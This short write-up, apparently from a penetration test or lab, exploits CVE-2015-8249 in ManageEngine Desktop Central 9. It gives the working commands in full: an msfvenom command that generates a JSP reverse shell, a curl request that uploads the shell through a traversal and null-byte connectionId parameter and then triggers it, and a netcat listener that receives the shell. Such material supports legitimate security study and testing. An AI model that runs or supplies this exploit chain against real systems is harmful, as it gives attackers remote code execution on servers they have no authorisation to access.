# Manage Engine Desktop Central 9
## Build No: 91084

Vulnerability ID: CVE-2015-8249
POC Code by Sinn3r at 
https://blog.rapid7.com/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249/

This vulnerability allows for uploading of files via PUT, through an insecure request parameter connectionId. 
The details are excellently presented in the linked post.

First a jsp reverse shell payload was created with:

```
msfvenom -p java/jsp_shell_reverse_tcp -f raw > a.txt
```
The file 'a.txt' was edited with local IP and port to use.

Next the one liner POST message was constructed as follows with proper directory traversal string:

```
curl -v -X POST "http://192.168.56.101:8022/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=deefunkt%2ephp&customerId=47474747" --data @a.txt --header "Content-Type:application/octet-stream" && curl http://192.168.56.101:8022/jspf/test.jsp
```

And a simple nc listener started with:

```
nc -lvv -p 4444
```
When the test.jsp page is fetched via curl, a shell opens on the netcat listener, unfortunately since the POC by sinn3r the current version now runs with local service privileges and so further privilege escalation needs to be conducted.

